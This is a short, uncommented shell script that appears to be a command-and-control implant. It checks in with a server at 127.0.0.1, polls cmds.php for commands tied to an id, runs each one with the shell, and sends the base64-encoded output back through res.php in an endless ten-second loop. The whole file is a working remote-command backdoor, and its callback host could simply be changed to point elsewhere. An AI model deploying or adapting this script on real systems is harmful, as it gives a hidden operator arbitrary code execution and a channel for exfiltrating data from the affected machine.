curl -s "127.0.0.1/res.php?res=$(echo "Hello from $1" | base64)&id=$1" > /dev/null
while true
do
run=$(curl -s 127.0.0.1/cmds.php?id=$1 | grep $1 | cut -f 2 -d ":")
if [ -z "$run" ];
then 
sleep 10
continue
fi
res=$($run 2>&1| base64 | tr -d '\n')
curl -s "127.0.0.1/res.php?res=$(echo $res)&id=$1" > /dev/null
sleep 10
done
